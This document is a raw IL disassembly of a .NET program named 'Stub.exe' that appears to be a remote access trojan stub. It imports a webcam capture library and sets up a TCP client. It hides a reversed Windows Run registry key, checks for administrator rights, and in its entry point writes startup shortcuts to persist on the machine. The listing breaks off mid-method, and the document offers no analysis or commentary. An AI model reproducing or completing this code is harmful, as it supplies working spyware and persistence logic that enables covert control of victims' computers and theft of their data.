
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.8.3928.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern user32.dll
.module extern kernel32
.module extern avicap32.dll
.module extern ntdll
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly Stub
{

  // 
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 03 00 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.
  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module Stub.exe
// MVID: {7E01A6C3-C719-45F5-9DFB-A0540952110E}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x05290000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // 
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase::.ctor()
    IL_0006:  ret
  } // end of method MyApplication::.ctor

} // end of class My.MyApplication

.class private auto ansi My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // 
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0006:  ret
  } // end of method MyComputer::.ctor

} // end of class My.MyComputer

.class private auto ansi sealed beforefieldinit My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .method public strict virtual instance bool 
            Equals(object o) cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // 
      .maxstack  2
      .locals init (bool V_0)
      IL_0000:  ldarg.0
      IL_0001:  ldarg.1
      IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0007:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000c:  ret
    } // end of method MyWebServices::Equals

    .method public strict virtual instance int32 
            GetHashCode() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // 
      .maxstack  1
      .locals init (int32 V_0)
      IL_0000:  ldarg.0
      IL_0001:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0006:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // 
      .maxstack  1
      .locals init (class [mscorlib]System.Type V_0)
      IL_0000:  ldtoken    My.MyProject/MyWebServices
      IL_0005:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000a:  ret
    } // end of method MyWebServices::GetType

    .method public strict virtual instance string 
            ToString() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // 
      .maxstack  1
      .locals init (string V_0)
      IL_0000:  ldarg.0
      IL_0001:  call       instance string [mscorlib]System.Object::ToString()
      IL_0006:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // 
      .maxstack  1
      .locals init (!!T V_0)
      IL_0000:  ldarg.0
      IL_0001:  box        !!T
      IL_0006:  brtrue.s   IL_000e

      IL_0008:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_000d:  ret

      IL_000e:  ldarg.0
      IL_000f:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // 
      .maxstack  2
      .locals init (!!T V_0)
      IL_0000:  ldarg.1
      IL_0001:  ldloca.s   V_0
      IL_0003:  initobj    !!T
      IL_0009:  ldloc.0
      IL_000a:  stobj      !!T
      IL_000f:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // 
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // 
      .maxstack  1
      .locals init (!T V_0)
      IL_0000:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0005:  box        !T
      IL_000a:  brtrue.s   IL_0016

      IL_000c:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0011:  stsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0016:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001b:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // 
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> m_AppObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // 
    .maxstack  8
    IL_0000:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::.ctor()
    IL_0005:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::.ctor()
    IL_000f:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // 
    .maxstack  1
    .locals init (class My.MyComputer V_0)
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // 
    .maxstack  1
    .locals init (class My.MyApplication V_0)
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // 
    .maxstack  1
    .locals init (class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User V_0)
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // 
    .maxstack  1
    .locals init (class My.MyProject/MyWebServices V_0)
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_WebServices

  .property class My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class My.MyComputer My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class My.MyApplication Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class My.MyApplication My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User My.MyProject::get_User()
  } // end of property MyProject::User
  .property class My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class My.MyProject/MyWebServices My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class My.MyProject

.class public auto ansi beforefieldinit L
       extends [mscorlib]System.Object
{
  .field public static string P
  .field public static string x
  .field public static string RG
  .field public static string sf
  .field public static string VN
  .field public static string Y
  .field public static string H
  .field public static string ss
  .field public static bool BD
  .field public static bool Idr
  .field public static bool IsF
  .field public static bool Isu
  .field public static bool att
  .field public static bool DIC
  .field public static string DR
  .field public static string EXE
  .field public static string Time
  .field public static string lastcap
  .field public static string VU
  .field public static string DS
  .field public static class [mscorlib]System.Security.Principal.WindowsIdentity Str_0
  .field public static class [mscorlib]System.Security.Principal.WindowsPrincipal Str_1
  .field public static object Fc
  .field public static string LIH
  .field public static string rgg
  .field private static uint8[] b
  .field public static class [System]System.Net.Sockets.TcpClient FCC
  .field public static bool Cn
  .field public static object PLG
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static class [mscorlib]System.IO.FileStream FS
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field private static class [mscorlib]System.IO.MemoryStream MeM
  .field public static object MT
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // 
    .maxstack  4
    .locals init (bool V_0)
    IL_0000:  ldstr      "P"
    IL_0005:  stsfld     string L::x
    IL_000a:  ldstr      "RG"
    IL_000f:  stsfld     string L::RG
    IL_0014:  ldstr      "nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS"
    IL_0019:  stsfld     string L::sf
    IL_001e:  ldstr      "VN"
    IL_0023:  stsfld     string L::VN
    IL_0028:  ldstr      "|-F-|"
    IL_002d:  stsfld     string L::Y
    IL_0032:  ldstr      "H"
    IL_0037:  stsfld     string L::ss
    IL_003c:  ldstr      "BD"
    IL_0041:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0046:  stsfld     bool L::BD
    IL_004b:  ldstr      "Idr"
    IL_0050:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0055:  stsfld     bool L::Idr
    IL_005a:  ldstr      "Isf"
    IL_005f:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0064:  stsfld     bool L::IsF
    IL_0069:  ldstr      "Isu"
    IL_006e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0073:  stsfld     bool L::Isu
    IL_0078:  ldstr      "att"
    IL_007d:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0082:  stsfld     bool L::att
    IL_0087:  ldstr      "DIC"
    IL_008c:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0091:  stsfld     bool L::DIC
    IL_0096:  ldstr      "DR"
    IL_009b:  stsfld     string L::DR
    IL_00a0:  ldstr      "EXE"
    IL_00a5:  stsfld     string L::EXE
    IL_00aa:  ldstr      "Time"
    IL_00af:  stsfld     string L::Time
    IL_00b4:  ldstr      ""
    IL_00b9:  stsfld     string L::lastcap
    IL_00be:  ldstr      "VU"
    IL_00c3:  stsfld     string L::VU
    IL_00c8:  ldstr      "DS"
    IL_00cd:  stsfld     string L::DS
    IL_00d2:  call       class [mscorlib]System.Security.Principal.WindowsIdentity [mscorlib]System.Security.Principal.WindowsIdentity::GetCurrent()
    IL_00d7:  stsfld     class [mscorlib]System.Security.Principal.WindowsIdentity L::Str_0
    IL_00dc:  ldsfld     class [mscorlib]System.Security.Principal.WindowsIdentity L::Str_0
    IL_00e1:  newobj     instance void [mscorlib]System.Security.Principal.WindowsPrincipal::.ctor(class [mscorlib]System.Security.Principal.WindowsIdentity)
    IL_00e6:  stsfld     class [mscorlib]System.Security.Principal.WindowsPrincipal L::Str_1
    IL_00eb:  ldsfld     class [mscorlib]System.Security.Principal.WindowsPrincipal L::Str_1
    IL_00f0:  ldc.i4     0x220
    IL_00f5:  callvirt   instance bool [mscorlib]System.Security.Principal.WindowsPrincipal::IsInRole(valuetype [mscorlib]System.Security.Principal.WindowsBuiltInRole)
    IL_00fa:  stloc.0
    IL_00fb:  ldloca.s   V_0
    IL_00fd:  call       instance string [mscorlib]System.Boolean::ToString()
    IL_0102:  ldstr      "False"
    IL_0107:  ldstr      "User"
    IL_010c:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_0111:  ldstr      "True"
    IL_0116:  ldstr      "Admin"
    IL_011b:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                          string)
    IL_0120:  stsfld     object L::Fc
    IL_0125:  ldc.i4.s   21
    IL_0127:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
    IL_012c:  ldstr      "\\"
    IL_0131:  ldsfld     string L::RG
    IL_0136:  ldstr      ".exe"
    IL_013b:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_0140:  stsfld     string L::LIH
    IL_0145:  ldc.i4.s   21
    IL_0147:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
    IL_014c:  ldstr      "\\"
    IL_0151:  ldsfld     string L::RG
    IL_0156:  ldstr      ".URL"
    IL_015b:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string,
                                                                string)
    IL_0160:  stsfld     string L::rgg
    IL_0165:  ldc.i4     0x1401
    IL_016a:  newarr     [mscorlib]System.Byte
    IL_016f:  stsfld     uint8[] L::b
    IL_0174:  ldnull
    IL_0175:  stsfld     class [System]System.Net.Sockets.TcpClient L::FCC
    IL_017a:  ldc.i4.0
    IL_017b:  stsfld     bool L::Cn
    IL_0180:  ldnull
    IL_0181:  stsfld     object L::PLG
    IL_0186:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_018b:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer L::F
    IL_0190:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
    IL_0195:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_019a:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_019f:  stsfld     class [mscorlib]System.IO.FileInfo L::LO
    IL_01a4:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_01a9:  stsfld     class [mscorlib]System.IO.MemoryStream L::MeM
    IL_01ae:  ldnull
    IL_01af:  stsfld     object L::MT
    IL_01b4:  ret
  } // end of method L::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // 
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method L::.ctor

  .method private static void  LOP(object a0) cil managed
  {
    // 
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  castclass  uint8[]
    IL_0006:  call       void L::Ind(uint8[])
    IL_000b:  ret
  } // end of method L::LOP

  .method public static void  main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // 
    .maxstack  9
    .locals init (object V_0,
             object V_1,
             class [mscorlib]System.Exception V_2,
             object[] V_3)
    .try
    {
      IL_0000:  ldstr      "WScript.Shell"
      IL_0005:  ldstr      ""
      IL_000a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
                                                                                                         string)
      IL_000f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0014:  ldnull
      IL_0015:  ldstr      "CreateShortcut"
      IL_001a:  ldc.i4.1
      IL_001b:  newarr     [mscorlib]System.Object
      IL_0020:  stloc.3
      IL_0021:  ldloc.3
      IL_0022:  ldc.i4.0
      IL_0023:  ldc.i4.7
      IL_0024:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0029:  ldstr      "\\"
      IL_002e:  ldsfld     string L::RG
      IL_0033:  ldstr      ".lnk"
      IL_0038:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_003d:  stelem.ref
      IL_003e:  ldloc.3
      IL_003f:  ldnull
      IL_0040:  ldnull
      IL_0041:  ldnull
      IL_0042:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0047:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_004c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0051:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0056:  stloc.0
      IL_0057:  ldloc.0
      IL_0058:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_005d:  ldnull
      IL_005e:  ldstr      "TargetPath"
      IL_0063:  ldc.i4.1
      IL_0064:  newarr     [mscorlib]System.Object
      IL_0069:  stloc.3
      IL_006a:  ldloc.3
      IL_006b:  ldc.i4.0
      IL_006c:  ldc.i4.7
      IL_006d:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0072:  ldstr      "\\"
      IL_0077:  ldsfld     string L::RG
      IL_007c:  ldstr      ".exe"
      IL_0081:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0086:  stelem.ref
      IL_0087:  ldloc.3
      IL_0088:  ldnull
      IL_0089:  ldnull
      IL_008a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_008f:  ldloc.0
      IL_0090:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0095:  ldnull
      IL_0096:  ldstr      "Save"
      IL_009b:  ldc.i4.0
      IL_009c:  newarr     [mscorlib]System.Object
      IL_00a1:  ldnull
      IL_00a2:  ldnull
      IL_00a3:  ldnull
      IL_00a4:  ldc.i4.1
      IL_00a5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_00aa:  pop
      IL_00ab:  ldstr      "WScript.Shell"
      IL_00b0:  ldstr      ""
      IL_00b5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
                                                                                                         string)
      IL_00ba:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00bf:  ldnull
      IL_00c0:  ldstr      "CreateShortcut"
      IL_00c5:  ldc.i4.1
      IL_00c6:  newarr     [mscorlib]System.Object
      IL_00cb:  stloc.3
      IL_00cc:  ldloc.3
      IL_00cd:  ldc.i4.0
      IL_00ce:  ldc.i4.s   21
      IL_00d0:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_00d5:  ldstr      "\\"
      IL_00da:  ldsfld     string L::RG
      IL_00df:  ldstr      ".lnk"
      IL_00e4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_00e9:  stelem.ref
      IL_00ea:  ldloc.3
